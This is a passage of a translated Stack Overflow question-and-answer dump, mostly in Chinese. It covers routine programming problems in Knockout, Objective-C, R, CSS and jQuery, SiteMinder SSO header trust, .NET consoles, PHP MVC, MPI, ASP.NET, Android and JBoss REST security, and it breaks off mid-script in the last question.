不应该`<!--ko foreach:-->`尊重 foreach 模板绑定使用的相同模式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T22:04:53.853

问题是您的模板绑定创建了对`people`observableArray 的订阅，因为它作为`data`. 当`people`数组更新（推送/删除项目等）时，这将触发模板绑定以重新渲染模板。在您的情况下，这会重新呈现所有内容，因此`foreach`模板内部永远不会有机会提高效率。

避免这种情况的一种简单方法是确保模板绑定不会打开您的`people`observableArray。您可以传递数据`{ myArray: people }`，然后执行您的`foreach`on `myArray`。

这是一个示例：http: [//jsfiddle.net/rniemeyer/bVPwM/4/](http://jsfiddle.net/rniemeyer/bVPwM/4/)

# ios - 如何用 sudzc 填充表格视图？（我的财产不工作）

> ID：10148655
> 
> 赞同：-1
> 
> 时间：2012-04-13T21:39:00.947
> 
> 标签：ios, ipad, tableview, sudzc

我有一个使用 sudzc 的课程。一切正常，使用 NSLog 我可以查看我的 Web 服务的数据，但是当我想使用一个数组然后在其他地方使用该数组时，该属性为空。我想用 Web 服务的数据填充表格视图，但我不能，怎么办？

这是我的课

```
 //
//  RootViewController.m
//  StratargetMovil
//
//  Created by Giovanni Cortés on 30/03/12.
//  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
//

#import "RootViewController.h"
#import "Page2.h"

@interface RootViewController ()
@end

@implementation RootViewController
@synthesize myData = _myData;
@synthesize empresaID = _empresaID;
@synthesize datos = _datos;
@synthesize idUnidadNegocio = _idUnidadNegocio;
@synthesize idArray = _idArray;

-(NSString *)empresaID
{
    _empresaID = @"fce";
    return _empresaID;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
        // Do any additional setup after loading the view from its nib.

    }
    return self;
}

- (void)viewDidLoad
{    
    // I want to fill the table view but dont work
    EWSEmpresaWebServiceSvc *service = [[EWSEmpresaWebServiceSvc alloc] init];
    [service ConsultarUnidadesOrganizacionalesPorEmpresa:self EmpresaId:self.empresaID];
}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
    self.datos = nil;
    self.myData = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return YES;
}

// Lo de la tabla
-(NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [self.myData count];
}

-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *SimpleTableIdentifier = @"SimpleTableIdentifier";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:SimpleTableIdentifier];

    if (cell == nil)
    {
        cell = [[[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:SimpleTableIdentifier] autorelease];

    }

    NSUInteger row = [indexPath row];
    cell.textLabel.text = [self.myData objectAtIndex:row];
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;

    return cell;

}

-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Muestra la vista 2 cuando se selecciona una fila
    [[tableView cellForRowAtIndexPath:indexPath] setSelected:NO animated:YES];

    self.idUnidadNegocio = [self.idArray objectAtIndex:indexPath.row];

    Page2 *nextNavigator = [[Page2 alloc] init];

    [[self navigationController] pushViewController:nextNavigator animated:YES];
    [nextNavigator release];

}

// -------------------------------------------------
// Consultar unidades organizaciones por empresa
- (void) ConsultarUnidadesOrganizacionalesPorEmpresaHandler: (id) value {

    // Handle errors
    if([value isKindOfClass:[NSError class]]) {
        NSLog(@"%@", value);
        return;
    }

    // Handle faults
    if([value isKindOfClass:[SoapFault class]]) {
        NSLog(@"%@", value);
        return;
    }               

    // Do something with the NSMutableArray* result
    NSMutableArray *result = (NSMutableArray*)value;
    NSMutableArray *unidadOrganizacional = [[NSMutableArray alloc] init];
    self.myData = [[[NSMutableArray array] init] autorelease];

    for (int i = 0; i < [result count]; i++)
    {
        EWSUnidadNegocio *empresa = [[EWSUnidadNegocio alloc] init];
        empresa = [result objectAtIndex:i];
        [unidadOrganizacional addObject:[empresa Descripcion]];

    }

    self.myData = unidadOrganizacional;

}
 -(void)onload:(id)value
{
    // Handle errors
    if([value isKindOfClass:[NSError class]]) {
        NSLog(@"%@", value);
        return;
    }

    // Handle faults
    if([value isKindOfClass:[SoapFault class]]) {
        NSLog(@"%@", value);
        return;
    }               

    // Do something with the NSMutableArray* result
    NSMutableArray *result = (NSMutableArray*)value;
    NSMutableArray *unidadOrganizacional = [[NSMutableArray alloc] init];
    self.myData = [[[NSMutableArray array] init] autorelease];

    for (int i = 0; i < [result count]; i++)
    {
        EWSUnidadNegocio *empresa = [[EWSUnidadNegocio alloc] init];
        empresa = [result objectAtIndex:i];
        NSLog(@"%ld -- %@", [empresa Id], [empresa Descripcion]); // With this I can watch the data in the console
        [unidadOrganizacional addObject:[empresa Descripcion]];

    }

    self.myData = unidadOrganizacional; // self.myData in another place is null
}

}
@end 
```

我的数据是

@property (nonatomic, 保留) NSMutableArray *myData;

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:47:57.573

我认为是`myData`自动发布的。您可以分配和初始化`myData`数组，但不能自动/释放它。`myData`（在方法的分配 处去掉autorelease `ConsultarUnidadesOrganizacionalesPorEmpresaHandler`）

不要忘记添加一个 dealloc 方法来释放`myData`（和其他）属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:57:02.547

首先，这对您没有任何帮助：

```
self.myData = [[[NSMutableArray array] init] autorelease];

...

self.myData = unidadOrganizacional; 
```

您正在分配 myData 然后立即重新分配它。

跳过第一次初始化并执行以下操作：

```
self.myData = [unidadOrganizacional mutableCopy]; 
```

我怀疑您在某些时候丢失了指向 unidadOrganizacional 数组的指针，这就是为什么您的 myData 为空。

就个人而言，虽然我只是在 viewDidLoad 调用中初始化 myData ，然后直接将对象添加到 myData ：

```
- (void)viewDidLoad
{    

    self.myData = [[NSMutableArray alloc] init];

    // I want to fill the table view but dont work
    EWSEmpresaWebServiceSvc *service = [[EWSEmpresaWebServiceSvc alloc] init];
    [service ConsultarUnidadesOrganizacionalesPorEmpresa:self EmpresaId:self.empresaID];
} 
```

进而：

```
- (void) ConsultarUnidadesOrganizacionalesPorEmpresaHandler: (id) value {

    // Handle errors
    if([value isKindOfClass:[NSError class]]) {
        NSLog(@"%@", value);
        return;
    }

    // Handle faults
    if([value isKindOfClass:[SoapFault class]]) {
        NSLog(@"%@", value);
        return;
    }               

    // Do something with the NSMutableArray* result
    NSMutableArray *result = (NSMutableArray*)value;

    for (int i = 0; i < [result count]; i++)
    {
        EWSUnidadNegocio *empresa = [[EWSUnidadNegocio alloc] init];
        empresa = [result objectAtIndex:i];
        [self.myData addObject:[empresa Descripcion]];
    }
}

-(void)onload:(id)value
{
    // Handle errors
    if([value isKindOfClass:[NSError class]]) {
        NSLog(@"%@", value);
        return;
    }

    // Handle faults
    if([value isKindOfClass:[SoapFault class]]) {
        NSLog(@"%@", value);
        return;
    }               

    // Do something with the NSMutableArray* result
    NSMutableArray *result = (NSMutableArray*)value;

    for (int i = 0; i < [result count]; i++)
    {
        EWSUnidadNegocio *empresa = [[EWSUnidadNegocio alloc] init];
        empresa = [result objectAtIndex:i];
        NSLog(@"%ld -- %@", [empresa Id], [empresa Descripcion]); // With this I can watch the data in the console
        [self.myData addObject:[empresa Descripcion]];

    }
} 
```

您可能想在通话之前清除 myData `ConsultarUnidadesOrganizacionalesPorEmpresa`，我不太确定这和真正的区别`onload`是什么。看起来它们是彼此的重复。

祝你好运！

# r - 在R中找到QQ图的斜率？

> ID：10148658
> 
> 赞同：2
> 
> 时间：2012-04-13T21:39:27.767
> 
> 标签：r, plot

我画了QQ图来测试数据是否来自指数分布。

我怎样才能找到QQ图的斜率？

# javascript - JavaScript - 在启动时隐藏一个 Div（加载）

> ID：10148660
> 
> 赞同：39
> 
> 时间：2012-04-13T21:39:42.867
> 
> 标签：javascript, jquery, css, html, hide

我的 php 页面中有一个 div，它在页面加载后使用 jQuery 隐藏它。但是有没有办法从加载的一开始就隐藏它？

我问的原因是因为在很短的一秒钟内，您可以在页面加载时看到 div，然后在页面完全加载时隐藏。

看起来很不专业。

只是想知道是否有办法解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：84
> 
> 时间：2012-04-13T21:40:37.827

使用 css 样式隐藏 div。

```
#selector { display: none; } 
```

或像下面这样使用它，

CSS：

```
.hidden { display: none; } 
```

HTML

```
<div id="blah" class="hidden"><!-- div content --></div> 
```

在 jQuery 中

```
 $(function () {
     $('#blah').removeClass('hidden');
 }); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-10-01T09:57:51.693

我有同样的问题。

使用 CSS 隐藏不是最好的解决方案，因为有时您希望没有 JS 的用户可以看到 div。最干净的解决方案是使用 JQuery 隐藏 div。但是 div 大约 0.5 秒可见，如果 div 位于页面顶部，这是有问题的。

在这些情况下，我使用中间解决方案，没有 JQuery。这个有效并且立即生效：

`<script>document.write('<style>.js_hidden { display: none; }</style>');</script>`

`<div class="js_hidden">This div will be hidden for JS users, and visible for non JS users.</div>`

当然，您仍然可以在 div 上添加您想要的所有效果，例如 JQuery toggle()。你会得到最好的行为（恕我直言）：

*   对于非 JS 用户，div 是直接可见的
*   对于 JS 用户，div 是隐藏的并且具有切换效果。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-04-13T21:42:41.683

除非使用 CSS 解决方案。最快的方法是立即用脚本隐藏它。

```
<div id="hideme"></div>
<script type="text/javascript">
    $("#hideme").hide();
</script> 
```

在这种情况下，我会推荐 Vega 的 CSS 解决方案。但是如果你需要更复杂的东西（比如动画），你可以使用这种方法。

这有一些复杂性（见下面的评论）。如果你想让这段脚本尽可能快地运行，你就不能使用 jQuery，只使用原生 JS 并推迟所有其他脚本的加载。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-13T21:41:18.107

为什么不添加“显示：无；” 到 div 样式属性？这就是 JQuery 的 .hide() 函数所做的一切。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-03-22T15:22:22.780

这种方法我用过很多次，不知道是不是一个很好的方法，但它可以很好地满足我的需要。

```
<html>
<head>  
    <script language="JavaScript">
    function setVisibility(id, visibility) {
    document.getElementById(id).style.display = visibility;
    }
    </script>
</head>
<body>
    <div id="HiddenStuff1" style="display:none">
    CONTENT TO HIDE 1
    </div>
    <div id="HiddenStuff2" style="display:none">
    CONTENT TO HIDE 2
    </div>
    <div id="HiddenStuff3" style="display:none">
    CONTENT TO HIDE 3
    </div>
    <input id="YOUR ID" title="HIDDEN STUFF 1" type=button name=type value='HIDDEN STUFF 1' onclick="setVisibility('HiddenStuff1', 'inline');setVisibility('HiddenStuff2', 'none');setVisibility('HiddenStuff3', 'none');";>
    <input id="YOUR ID" title="HIDDEN STUFF 2" type=button name=type value='HIDDEN STUFF 2' onclick="setVisibility('HiddenStuff1', 'none');setVisibility('HiddenStuff2', 'inline');setVisibility('HiddenStuff3', 'none');";>
    <input id="YOUR ID" title="HIDDEN STUFF 3" type=button name=type value='HIDDEN STUFF 3' onclick="setVisibility('HiddenStuff1', 'none');setVisibility('HiddenStuff2', 'none');setVisibility('HiddenStuff3', 'inline');";>
</body>
</html> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-13T21:41:32.143

使用 CSS，您可以为 CSS 文件或样式属性中的元素设置 display:none

```
#div { display:none; }
<div id="div"></div>

<div style="display:none"></div> 
```

或者在 div 之后使用 js 也可能足够快，但不够干净

# css - 如何在 CSS 中使网页居中

> ID：10148661
> 
> 赞同：3
> 
> 时间：2012-04-13T21:39:50.273
> 
> 标签：css

我是 CSS 的新手。我已经将我的 psd 文件转换为 html/css 。现在我想将我的网页页面移动到窗口的中心。我尝试了一些代码，并且该代码仅对齐文本背景图像“ back.gif" 留在左边.. 这是我的 html 和 CSS 代码"

```
**HTML**

<body>
<div id="main">

      <div id="header">
     <div id="logo">
            <img src="logo.gif" />
         </div>
      </div>

     <div id="menu">
     <img src="images/menu_07.gif" />
           <div id="m">
             <ul>
               <li> <a href="index.php">Home</a></li>
               <li> <a href="pages.php">Pages</a></li>
               <li> <a href="donor.php">Donor</a></li>
               <li><a href="seeker.php">Seeker</a></li>
               <li><a href="hospitals.php">Hospitals</a></li>
               <li><a href="lifesaving.php">Life Saving Contacts</a></li>
               <li><a href="contactus.php">Feedback</a></li>
             </ul>
           </div>
     </div>

     <div id="content">
     <div id="center" align="center">
             <h3>WELCOME TO ADMIN AREA</h3>
             <p id="ajk">AJKBLOODBANK.COM</p>
         <?php
              echo "welcome!".$_SESSION['username'];
              echo "<br>";
              echo "<a href=logout.php>Logout</a>&nbsp;";
             ?>
         </div>
     </div>

     <div id="footer">
     </div>
</div>
</body>

**CSS**
body
{

    background:url(../back.gif) repeat-y;   
    padding-left:105px;
    height:900px;
    text-align: center;
    margin:auto;
    min-width: 760px;
}
div#main 
{
    width: 720px;
    margin: 0 auto;
    text-align: left;
}

#header
{
    width:787px;
    margin-top:10px;
}

#menu
{

    width:787px;    
    float:left;
    margin-top:20px;

}

#content
{
    background-color:#FFF;
    border:groove;
    width:790px;
    float:left;
    padding-top:30px;
    margin-top:30px;
}
#footer
{
        float:left;
        height:52px;
        width:790px;
} 
```

请告诉我我在哪里做错了..

```
the diameseion of background image "backgif" = 995x1000 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:41:09.140

无论您想要居中的哪个元素 - 设置一个明确的宽度，然后将左/右边距设置为`auto`

```
#main { width:995px; margin:0 auto; } 
```

...这将使元素在其父元素中居中。如果您要居中`#main`，它将在页面上居中（假设您的`body`宽度为 100%）

***编辑***

尝试使您的背景图像应用于`#main`而不是`body`. `background-position`或者，使用或速记使背景图像居中：

```
body { background:url(../back.gif) repeat-y center top; } 
```

干杯

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T21:41:22.257

为了使 body 元素居中，我会使用类似的东西：

```
.body {
    width: 940px;
    margin-left: auto;
    margin-right: auto;
} 
```

# single-sign-on - 我如何才能相信 SiteMinder HTTP 标头没有被篡改？

> ID：10148666
> 
> 赞同：18
> 
> 时间：2012-04-13T21:40:09.293
> 
> 标签：single-sign-on, siteminder

一般来说，我对 SiteMinder 和 SSO 完全陌生。我整个下午都在 SO 和 CA 的网站上四处寻找一个基本示例，但找不到。我不关心设置或编程 SM 或类似的东西。所有这些都已经由其他人完成。我只想调整我的 JS Web 应用程序以使用 SM 进行身份验证。

我知道 SM 将添加一个带有诸如 SM_USER 之类的键的 HTTP 标头，它会告诉我用户是谁。我没有得到的是 - 是什么阻止任何人自己添加此标头并完全绕过 SM？我必须在我的服务器端代码中输入什么来验证 SM_USER 是否真的来自 SM？我想涉及到安全cookie...

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-19T21:04:50.933

安装在 Web Server 上的**SM Web Agent**旨在拦截所有流量并检查资源请求是否...

1.  受 SiteMinder 保护

2.  如果用户有一个有效的 SMSESSION（即是*Authenticated*）

3.  如果 1 和 2 为真，那么 WA 会检查 Siteminder 策略服务器以查看用户是否被*授权*访问所请求的资源。

为确保您没有用户信息的 HTTP 标头注入，SiteMinder WebAgent 将重写所有 SiteMinder 特定的 HTTP 标头信息。本质上，这意味着您可以“信任” `SM_`WebAgent 提供的有关用户的信息，因为它是由服务器上的 Web 代理创建的，而不是传入请求的一部分。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-19T18:40:05.743

因为所有流量都应该通过 Siteminder Web 代理，所以即使用户设置了这个标头，它也会被覆盖/删除

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-06T11:37:35.467

所有 Siteminder 架构确实都假设应用程序只需要信任“SM_”标头。

实际上，这可能还不够，具体取决于应用程序的架构。基本上，您有 3 种情况：

*   Web 代理安装在您的应用程序运行的 Web 服务器上（Apache/PHP 应用程序的典型情况）：如上所述，您可以信任标头，因为没有经过 Web 代理过滤的请求可以到达您的应用程序。
*   Web 代理安装在与您的应用程序运行的不同的 Web 服务器上，但在同一台机器上（典型情况：SM 代理安装在为 JEE 应用服务器服务的 Apache 前端）：您必须确保没有请求可以直接访问您的应用程序服务器。要么将应用程序服务器绑定到环回接口，要么过滤服务器上的端口。
*   Web 代理在应用程序前面的反向代理上运行。同样的评论。这里唯一的解决方案是在您的应用程序上实施 IP 过滤器，以仅允许来自您的反向代理的请求。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-12-13T18:31:56.697

SiteMinder r12.52 包含一个名为“Enhanced Session Assurance with DeviceDNA™”的新功能。DeviceDNA 可用于确保 SiteMinder 会话 Cookie 未被篡改。如果 Session 在另一台机器上重放，或者从同一台机器上的另一个浏览器实例重放，DeviceDNA 将捕捉到这一点并阻止请求。

[单击此处查看讨论 CA SiteMinder r12.52 中的新功能的网络广播](https://www.brighttalk.com/webcast/7845/91999)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-04-23T15:07:02.977

典型的企业架构将是 Webserver (Siteminder Agent) + AppServer (Applications)

假设未启用 IP 过滤，并且允许直接向 AppServer 发送 Web 请求，绕过 Web 服务器和 sso-agent。

如果应用程序必须实现一个解决方案来断言请求标头/cookie 未被篡改/注入，我们是否有与以下类似的解决方案？

*   发送在单独的 cookie 中加密或加密 (Sym/Asym) 的 SM_USERID 以及 SMSESSION id
*   应用程序将使用密钥解密 SMSESSION 或 SM_USERID 以检索用户 ID、会话到期状态以及任何其他附加详细信息和授权详细信息（如果适用）。
*   应用程序现在信任 user_id 并进行身份验证

# .net - 在 .NET 中同时读取和写入控制台

> ID：10148667
> 
> 赞同：0
> 
> 时间：2012-04-13T21:40:10.823
> 
> 标签：.net, console

我正在构建一个 .NET 4.0 控制台应用程序，该应用程序不断（即通常每隔几秒钟）向控制台输出信息。这是一个多线程应用程序，不同的线程在不同的时间写入控制台。

问题是我想在这一切发生时接受用户输入。用户输入可以随时发生。

我尝试了两种不同的方法，但都不是很好。

1.  我尝试使用单独的线程通过查找来阅读`Console.KeyAvailable`。这“有效”但确实令人困惑，因为在您尝试输入时正在将字符串写入输出。这使光标在打字时四处移动并且迷失方向。

2.  我尝试使用`Console.SetCursorPosition`将控制台分成两个“窗格”。上输出，下输入。`Console.Clear()`这也有效，但我每次绘制屏幕后都必须打电话。这非常慢，并导致疯狂的屏幕闪烁。

似乎我唯一的其他选择是编写一个 Windows 窗体应用程序或 WPF 应用程序来模拟控制台。这似乎很荒谬，因为我唯一想做的就是接受自发的用户输入。

我的 google-fu 没有找到任何有效的控制台替代品或任何构建了模拟控制台的 .NET 应用程序的人......

我被困在这里了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:41:38.520

这是可能的，但很难。这不是我建议尝试的东西。您必须创建一个`TextWriter`您设置的自定义 ( `Console.SetOut`)。这`TextWriter`会在控制台窗口底部留下一两行供您编写。您最终不得不自己滚动窗口，自己定位光标等。您还必须担心换行和所有这些腐烂。真是……让人抓狂。

如果您想使用它，您需要对[Console API](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682010%28v=vs.85%29.aspx)有深入的了解，以及它的 .NET 包装器。几年前，我发布了一个 .NET 包装器。你可以用那个包装器来做这一切。[您可以从http://mischel.com/pubs/consoledotnet.zip](http://mischel.com/pubs/consoledotnet.zip)下载包装器

我写了三篇关于它的文章，其中两篇仍然可用。看

[http://www.devsource.com/c/a/Using-VS/Working-with-Console-Screen-Buffers-in-NET/](http://www.devsource.com/c/a/Using-VS/Working-with-Console-Screen-Buffers-in-NET/)

和

[http://www.devsource.com/c/a/Using-VS/Console-Input-in-NET/](http://www.devsource.com/c/a/Using-VS/Console-Input-in-NET/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:50:16.237

有 2 个控制台窗口怎么样？一个用于输入，另一个用于输出。您可以使用 WinApi 创建控制台窗口。

# php - MVC - 实现模型

> ID：10148668
> 
> 赞同：1
> 
> 时间：2012-04-13T21:40:23.713
> 
> 标签：php, model-view-controller, model, controller

我对模型的实现有疑问，找不到问题的合理解释。我会给你一个我正在工作的例子，它是一个实现博客的 MVC。

我是负责控制阅读特定帖子博客的 ControllerPost，因此拥有 ModelPost

ModelPost 必须包含所有需要的方法？

```
method getPost()
method getComment()
method getArchive() 
```

还是我应该隔离这些方法？

```
ModelPost
     method getPost()
ModelComment
     method getComment()
ModelArchive
     method getArchive() 
```

这让我很困惑，我看到了例子但没有正确的解释。我希望这在我的疑问中很清楚，否则请尝试更具解释性

谢谢大家

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:03:34.603

在我从事的大多数项目中，我们都有一个用于数据库表的模型类。主要使用 Zend MVC，这意味着为每个实体扩展 Zend_Db_Table 类。因此，在您的情况下，如果评论、帖子和存档是不同的表（我想它们是），我将使用 get、update、insert 和 delete（以及其他类似）方法构建单独的类。

这可能有点偏离主题，但我建议您查看域驱动开发 (DDD)：这里有一些很好的阅读材料的链接：[Zend 的域驱动设计](https://stackoverflow.com/questions/2582745/domain-driven-design-with-zend)

也给这个阅读：

*   [http://phpmaster.com/building-a-domain-model/](http://phpmaster.com/building-a-domain-model/)
*   [http://phpmaster.com/integrating-the-data-mappers/](http://phpmaster.com/integrating-the-data-mappers/)
*   [http://phpmaster.com/an-introduction-to-services/](http://phpmaster.com/an-introduction-to-services/)

DDD 的主要内容是，它将您的思维方式从考虑数据库表转变为考虑应用程序的主要逻辑部分，然后在其下方缓慢添加持久层，并在其上方添加应用程序和服务层。

# visual-c++ - Microsoft HPC Pack 2008 R2 中是否不包含 MPI c++ 命名空间？

> ID：10148669
> 
> 赞同：1
> 
> 时间：2012-04-13T21:40:23.960
> 
> 标签：visual-c++, mpi, hpc

安装 Microsoft HPC Pack 2008 R2 并使用 Visual Studio 2010 Professional 后，我能够使用 C 风格而不是 C++ 风格运行 MPI 程序。例如：

```
#include <mpi.h>

int main()
{
  MPI_Init(NULL,NULL);
  .
  .
  .
  MPI_Finalize();
  return 0;
} 
```

有效，但

```
#include <mpi.h>

int main()
{
  MPI::Init(NULL,NULL);
  .
  .
  .
  MPI::Finalize();
  return 0;
} 
```

没有。错误消息说找不到命名空间 MPI。我在做傻事吗？这是很有可能的。任何帮助表示赞赏。

谢谢，

-努恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T23:28:41.503

[http://mpi-forum.org/docs/mpi-2.2/mpi22-report/node328.htm](http://mpi-forum.org/docs/mpi-2.2/mpi22-report/node328.htm)

从 MPI 2.2 开始：

> 整个 C++ 语言绑定集已被弃用。
> 
> 基本原理。
> 
> C++ 绑定在 C 绑定上添加了最少的功能，同时对 MPI 规范进行了大量维护。由于 C++ 绑定实际上是 C 绑定的一对一映射，因此将现有 C++ MPI 应用程序转换为使用 MPI C 绑定应该相对容易。此外，还有一些第三方包可提供 C++ 类库功能（即，在 MPI C 绑定之上分层的 C++ 特定功能），这些功能对于 C++ 程序员来说可能更具表达性和/或自然性，并且不适合在此进行标准化规格。（理由结束。）

# asp.net - 对 ASP.NET 输入按钮使用 CSS 按钮样式？

> ID：10148684
> 
> 赞同：1
> 
> 时间：2012-04-13T21:41:22.583
> 
> 标签：asp.net, html, css

我知道这里一定有一个简单的答案。. . 我有一个 ASP.NET 应用程序，并且正在使用我购买的 HTML 模板。该模板具有按钮的 CSS 定义，例如（注意没有定义类）

```
<button type="submit"> 
```

但我使用的 ASP.NET 按钮呈现为

```
<input type="submit"> 
```

我怎样才能使两个按钮以相同的方式呈现？我需要输入标签与按钮标签具有相同的格式

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:49:48.180

不是太微不足道，但有办法做到这一点（[**文章在这里**](http://www.delphicsage.com/home/blog.aspx/d=239/title=Convert_Your_ASPButton_Controls_to_Sliding_Doors_Styled_Button_Elements_)）

基本上，您需要实现一个控制适配器并获取一个 .browser 文件才能让您的应用程序以这种方式呈现它。看看这篇文章。

# android - Dialog in trivial Android app is not shown?

> ID：10148687
> 
> 赞同：2
> 
> 时间：2012-04-13T21:41:36.533
> 
> 标签：android, android-emulator

I have following app. I am trying to do a very simple thing . Just show alert when it starts . But it just shows this message

```
"[2012-04-13 17:38:23 - HelloDriod] ActivityManager: Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=hellodriod.hello/.HelloDriodActivity }
[2012-04-13 17:38:23 - HelloDriod] ActivityManager: Warning: Activity not started, its current task has been brought to the front" 
```

On emulator I see just project name and blank screen . Am I missing anything ? Any directions appreciated .

```
package hellodriod.hello;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;

public class HelloDriodActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Are you sure you want to exit?")
               .setCancelable(false)
               .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                   public void onClick(DialogInterface dialog, int id) {

                   }
               })
               .setNegativeButton("No", new DialogInterface.OnClickListener() {
                   public void onClick(DialogInterface dialog, int id) {
                        dialog.cancel();
                   }
               });
        AlertDialog alert = builder.create();

    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-13T21:44:57.467

You are actualy not showing your dialog.

```
alert.show(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:45:21.633

The message you get is just telling you that there is nothing new to compile, you are already running the latest version, which is now displayed on your device.

# security - 如何保护在 JBossAS7 上运行的 Restful 服务（SSB 公开为服务）？

> ID：10148690
> 
> 赞同：3
> 
> 时间：2012-04-13T21:41:42.583
> 
> 标签：security, jax-rs, resteasy, jboss7.x, ws-security

上下文：我在 JBoss AS7 社区版本上运行我的应用程序。我正在使用来自 jboss 的 JaxRS 的 Java API。（不确定它是否与 RestEasy 相同？！）这是我的 Maven 依赖项

```
 <dependency>
         <groupId>org.jboss.spec.javax.ws.rs</groupId>
         <artifactId>jboss-jaxrs-api_1.1_spec</artifactId>
         <scope>provided</scope>
      </dependency> 
```

我正在使用 JaxRSActivator 在应用程序中启用 JAX-RS，如下所示。据我了解，这取代了在 web.xml 中进行 servlet 映射的需要

```
 @ApplicationPath("/rest")
public class JaxRsActivator extends Application {
   /* class body intentionally left blank */
} 
```

我创建了一个 EJB (SSB) 并将其公开为一个 Restful 服务，如下所示“

```
@Path("/Items")
@Stateless
@TransactionAttribute(TransactionAttributeType.REQUIRES_NEW)
public class ItemMgmtServiceBean {

    @GET
    @Path("/{id:[0-9][0-9]*}")
    @Produces("text/xml")
    public Item findItem(@PathParam("id")long itemId) 
```

上面的 REST 服务在 JBoss AS7 上完美运行。请注意，到目前为止，我不必使用 web.xml。

现在我想保护这项服务。我想在此服务中使用编程安全性来查找主体名称（根据我的业务逻辑）。

RestEasy 文档说我不应该打开 EJB 的上下文参数。

```
 <context-param>
      <param-name>resteasy.role.based.security</param-name>
      <param-value>true</param-value>
   </context-param> 
```

但是，它没有解释我应该在 web.xml 中使用什么，或者我是否需要将 web.xml 用于基于 EJB 的 restful 服务。

问题：

我想使用摘要身份验证。我需要采取哪些步骤才能启用此功能？.

我需要添加 web.xml 还是可以更改`JaxRSActivator`以启用安全性？如果我需要 web.xml 我应该删除`JaxRSActivator`吗？我应该在 web.xml 中配置什么？

感谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:45:13.117

[http://docs.jboss.org/resteasy/2.0.0.GA/userguide/html/Securing_JAX-RS_and_RESTeasy.html](http://docs.jboss.org/resteasy/2.0.0.GA/userguide/html/Securing_JAX-RS_and_RESTeasy.html)

Resteasy JAX-RS 支持 JAX-RS 方法上的 @RolesAllowed、@PermitAll 和 @DenyAll 注释。但默认情况下，Resteasy 不识别这些注释。您必须通过设置上下文参数来配置 Resteasy 以打开基于角色的安全性。笔记！！！如果您使用 EJB，请不要打开此开关。EJB 容器将提供此功能而不是 Resteasy。

# jquery - 鼠标离开子菜单时隐藏子菜单

> ID：10148693
> 
> 赞同：0
> 
> 时间：2012-04-13T21:42:08.373
> 
> 标签：jquery, drop-down-menu

我想创建一个当鼠标悬停在菜单项上时出现的子菜单。我遇到一个问题，当鼠标离开子菜单时，我希望子菜单消失，例如鼠标移动到网站的底部或右侧或左侧。

这是我的菜单脚本，我在 jsfiddle [http://jsfiddle.net/2jUQS/1/中制作了我的菜单的样本](http://jsfiddle.net/2jUQS/1/)

```
<div id="header">
   <ul id="menu">
    <li>
        <a href="#" class="wordsMenu">About Company</a>
    </li>
    <li>
        <a href="#" class="galaryMenu">Gallary</a>
    </li>

 </ul>
</div>
    <div id="submenus">
         <div id="galarySubMenu" class="subMenuContainer">
    <ul class="subMenuList">
        <li><a href="PhotoGallery.php">Photo Gallary</a></li>
        <li><a href="videoGallery.php">Video Gallary</a></li>
    </ul>
</div>

</div> 
```

这是脚本

```
$("document").ready(function(){

  $("a.wordsMenu").bind( 'mouseover',function(){
    $("#galarySubMenu").fadeOut("fast");
  });

 $("a.galaryMenu").bind( 'mouseover',function(){

    $("#galarySubMenu").css("display","block");
    var margin_top = $("#header").height();
    var testMarginTop=parseInt($("#galarySubMenu").css("top"));
    if(testMarginTop<0){
        $("#galarySubMenu").animate({
            'top':margin_top-2
        }, {
        'duration':500,
        queue:false
    });
    }
    else{
        $("#galarySubMenu").animate({
            'top':'-300'
        },  {
        'duration':500,
        queue:false
    });
    }
});

/*
